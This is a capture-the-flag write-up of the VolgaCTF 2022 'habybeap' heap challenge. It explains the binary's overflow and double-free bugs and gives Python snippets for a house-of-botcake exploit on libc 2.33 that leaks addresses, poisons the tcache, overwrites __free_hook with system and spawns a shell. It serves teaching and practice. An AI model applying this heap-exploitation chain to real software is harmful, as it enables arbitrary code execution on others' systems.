# Writeup of habybeap challenge from VolgaCTF 2022
TLDR: Classic house of botcake exploit on libc 2.33 with free_hook.

Writeup author: [clasm](https://wil-gibbs.com)

Exploit Script: [x.py](./armutism/src/build/x.py)

The challenge description given is the following:

```
This is a basic heap challenge. Flag is in /task/flag.txt.

nc habybeap.q.2022.volgactf.ru 21337
```

Alongside the `habybeap` binary, we're also given the `libc.so.6` and `ld-2.33.so`. 

I've included a patched version `habybeap_patched` uses the provided `ld-2.33.so` and `libc.so.6`. (created with [pwninit](https://github.com/io12/pwninit))


## Challenge
Running [checksec](https://docs.pwntools.com/en/stable/commandline.html?highlight=checksec#pwn-checksec)  on the binary shows us that all protections but
stack canaries are on.
```
[*] habybeap
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Let's take a look at what the challenge actually lets us do.

```
~/ctfs/volga/habybeap » ./habybeap_patched                                                                 clasm@ctf-vm
----YET ANOTHER NOTE TASK----
[1] Add note
[2] Edit note
[3] Delete note
[4] Print note
[5] Exit
Input your choice>>
```

## The Vulns
Looking through IDA, we can see when adding a note it can either be big or small (allocating either an `0x70` or `0x90` chunk) but we are able to write `0x78` no matter the size chosen. Note that we are 
also only able to allocate up to `16` chunks.
```C
int add_note()
{
  unsigned int v1; // ebx
  unsigned int idx; // [rsp+8h] [rbp-18h] BYREF
  int big_small[3]; // [rsp+Ch] [rbp-14h] BYREF

  idx = 16;
  big_small[0] = 0;
  write(1, "\nInput your index>> ", 0x14uLL);
  if ( (int)__isoc99_scanf("%u", &idx) <= 0 )
    exit(0);
  if ( idx > 0xF || (&ptrs)[idx] )
    return puts("Index is out of bounds");
  write(1, "1 for big, 0 for smol >> ", 0x19uLL);
  if ( (int)__isoc99_scanf("%u", big_small) <= 0 )
    exit(0);
  v1 = idx;
  if ( big_small[0] )                           // BIG
  {
    (&ptrs)[v1] = (unsigned __int64 *)malloc(0x79uLL);
    memset((&ptrs)[idx], 0, 0x79uLL);
  }
  else                                          // SMALL
  {
    (&ptrs)[v1] = (unsigned __int64 *)malloc(0x68uLL);
    memset((&ptrs)[idx], 0, 0x68uLL);
  }
  write(1, "Input your data>> ", 0x12uLL);
  return read(0, (&ptrs)[idx], 0x78uLL);        // overwrite if small chunk
}
```

This gives us the ability to overwrite any chunk directly below an 0x70 chunk.

`delete_note` gives us the ability to arbitrarily free any note as long as it exists in the pointer list. HOWEVER, it does not clear 
the freed pointer from the list allowing us to double free pointer,
but also limiting us to 16 allocations `ONLY`.

```C
void delete_note()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h] BYREF

  idx = 16;
  write(1, "\nInput your index>> ", 0x14uLL);
  if ( (int)__isoc99_scanf("%u", &idx) <= 0 )
    exit(0);
  if ( idx <= 0xF && (&ptrs)[idx] )
    free((&ptrs)[idx]);
  else
    puts("Index is out of bounds");
}
```

`print_note` is an exact copy of `delete_note` except instead 
of freeing the note, it calls `puts` with the note pointer.

```C
int print_note()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h] BYREF

  idx = 16;
  write(1, "\nInput your index>> ", 0x14uLL);
  if ( (int)__isoc99_scanf("%u", &idx) <= 0 )
    exit(0);
  if ( idx <= 0xF && ptrs[idx] )
    return puts(ptrs[idx]);
  else
    return puts("Index is out of bounds");
}
```

`edit_note` allows us to write 6 bytes to any note pointer.

```C
int edit_note()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h] BYREF

  idx = 16;
  write(1, "\nInput your index>> ", 0x14uLL);
  if ( (int)__isoc99_scanf("%u", &idx) <= 0 )
    exit(0);
  if ( idx > 0xF )
    return puts("Index is out of bounds");
  write(1, "Input your data>> ", 0x12uLL);
  return read(0, (&ptrs)[idx], 6uLL);
}
```

## Exploitation

This is looking like a pretty standard heap challenge, messing
with the `add`, `delete`, and `print` functions shows we can get
a heap leak fairly easily.

```
----YET ANOTHER NOTE TASK----
[1] Add note
[2] Edit note
[3] Delete note
[4] Print note
[5] Exit
Input your choice>> 1

Input your index>> 0
1 for big, 0 for smol >> 0
Input your data>> hello
[1] Add note
[2] Edit note
[3] Delete note
[4] Print note
[5] Exit
Input your choice>> 3

Input your index>> 0
[1] Add note
[2] Edit note
[3] Delete note
[4] Print note
[5] Exit
Input your choice>> 4

Input your index>> 0
0�K`
[1] Add note
[2] Edit note
[3] Delete note
[4] Print note
[5] Exit
```
However, we need more than just a heap leak to exploit this challenge.

Luckily for us `__free_hook` still exists in `libc 2.33`.
```
gef➤  p &__free_hook
$1 = (void (**)(void *, const void *)) 0x7ffff7face48 <__free_hook>
```

Let's use [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.33/house_of_botcake.c) to get a libc pointer so we can find `__free_hook`.

This basically works by filling up `t-cache` of a certain size and allocating a few more chunks of the same size to give us
an unsorted bin chunk with a reference to libc.

(I followed house_of_botcake.c fairly closely with no issues.)
```python
for i in range(7):
    add_note(i, b"HELLO", big=True)
add_note(7, b"prev", big=True)
add_note(8, b"a", big=True)
add_note(9, b"small")

for i in range(7):
    delete_note(i)

delete_note(8)
delete_note(7)
print_note(8)
add_note(10, b"AAAA", big=True)
delete_note(8)
```

Unfortunately, the pointer to the `unsorted-bin` chunk isn't added to our list of accessable pointers.
Now `note #8` and `note #7` point to somwhere inside the `unsorted-bin` chunk.

We can see the `unsorted-bin` as the last chunk and `note #9` just above it.
```
Chunk(addr=0x55ecd22bb2a0, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb2a0     bb 22 cd 5e 05 00 00 00 10 b0 2b d2 ec 55 00 00    .".^......+..U..]

Chunk(addr=0x55ecd22bb330, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb330     1b 90 e6 8c e9 55 00 00 10 b0 2b d2 ec 55 00 00    .....U....+..U..]

Chunk(addr=0x55ecd22bb3c0, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb3c0     8b 91 e6 8c e9 55 00 00 10 b0 2b d2 ec 55 00 00    .....U....+..U..]

Chunk(addr=0x55ecd22bb450, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb450     7b 91 e6 8c e9 55 00 00 10 b0 2b d2 ec 55 00 00    {....U....+..U..]

Chunk(addr=0x55ecd22bb4e0, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb4e0     eb 96 e6 8c e9 55 00 00 10 b0 2b d2 ec 55 00 00    .....U....+..U..]

Chunk(addr=0x55ecd22bb570, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb570     5b 96 e6 8c e9 55 00 00 10 b0 2b d2 ec 55 00 00    [....U....+..U..]

Chunk(addr=0x55ecd22bb600, size=0x90, flags=PREV_INUSE)
    [0x000055ecd22bb600     41 41 41 41 0a 00 00 00 00 00 00 00 00 00 00 00    AAAA............]

Chunk(addr=0x55ecd22bb690, size=0x70, flags=PREV_INUSE)  //Note #9
    [0x000055ecd22bb690     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]

Chunk(addr=0x55ecd22bb700, size=0xb0, flags=PREV_INUSE)  //unsorted bin
    [0x000055ecd22bb700     00 bc 54 5c b2 7f 00 00 00 bc 54 5c b2 7f 00 00    ..T\......T\....]
```

Unfortuantely, we can't just `print_note` `note #8` to get a `libc` pointer for two reasons.
The libc addr starts with `00` and puts will just give us an empty output.
And we don't actually have a pointer to the start of the `unsorted-bin` chunk.

Instead, we can take advantage of `note #9` being an `0x70` allocation.
When it's re-used we get an `8-byte` overwrite into the next chunk.
```python
add_note(11, b"A"*0x70)
```
Which looks something like this:
```
Chunk(addr=0x55ecd22bb690, size=0x70, flags=PREV_INUSE)  //Note #9
    [0x000055ecd22bb690     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]

Chunk(addr=0x55ecd22bb700, size=0xb0, flags=PREV_INUSE)  //unsorted bin
    [0x000055ecd22bb700     0a bc 54 5c b2 7f 00 00 00 bc 54 5c b2 7f 00 00    ..T\......T\....]
```

With this, we can print out the `libc` address.
```python
unsorted_leak = u64(b"\x00" + print_note(7)[0x72:-1] + b"\x00"*2)
```

Let's not forget to leak heap key because this is `libc 2.33`.
```python
heap_leak = u64(print_note(0)[1:-1] + b"\x00"*3)
```

All our leaks look something like this:
```
LIBC LEAK: 0x7fb25c36b000
SYSTEM:    0x7fb25c3baa60
FREE HOOK: 0x7fb25c54ee20
HEAP KEY: 0x55ecd22bb
```

Let's finish the exploit by writing to `__free_hook` through inserting the chunk
into our `t-cache` list.

We can use the `edit_note` function to overwrite the `t-cache` pointer in `node #5`.
We also need to xor the `__free_hook` address with our `heap key` so that it becomes a valid pointer.

```python
edit_note(5, p64(libc.sym['__free_hook'] ^ heap_leak)[:6], newline=False)
```

Our Tcache list should now look something like this:
```
Tcachebins[idx=7, size=0x90] count=6  ←  Chunk(addr=0x55688c487570, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x7fb25c54ee20, size=0x0, flags=! PREV_INUSE)  ←  [Corrupted chunk at 0x7f6031501]
```

We can see that `__free_hook`'s address was successfully added to the list and we'll get a reference in three allocations.

```
add_note(13, b"/bin/sh\x00", big=True)
add_note(14, b"TEST", big=True)
add_note(15, p64(libc.sym["system"]), big=True)
```

We added `note #15` will write the address of `system` to `__free_hook` so the next note we free will call system
with the pointer to the note.
We add `"/bin/sh\x00"` to `note #13` so that the note becomes a pointer to the string for us.
And `note #14` is just to exhaust one of the `t-cache` allocations.

Finally, we `delete` `note #13` giving us a shell :)

```python
delete_note(13)
r.interactive()
```

```
~/ctfs/volga/habybeap » python solve.py LOCAL                                                                                                                                 clasm@ctf-vm
[+] Starting local process 'habybeap_patched': pid 4747
LIBC LEAK: 0x7f73d4311000
SYSTEM: 0x7f73d4360a60
FREE HOOK: 0x7f73d44f4e20
HEAP KEY: 0x55ff1bbc6
[*] Switching to interactive mode
 $ ls
habybeap      habybeap.id1  habybeap_patched  ld.so
habybeap.i64  habybeap.id2  habybeap.til      libc.so.6
habybeap.id0  habybeap.nam  ld-2.33.so          solve.py
$
```
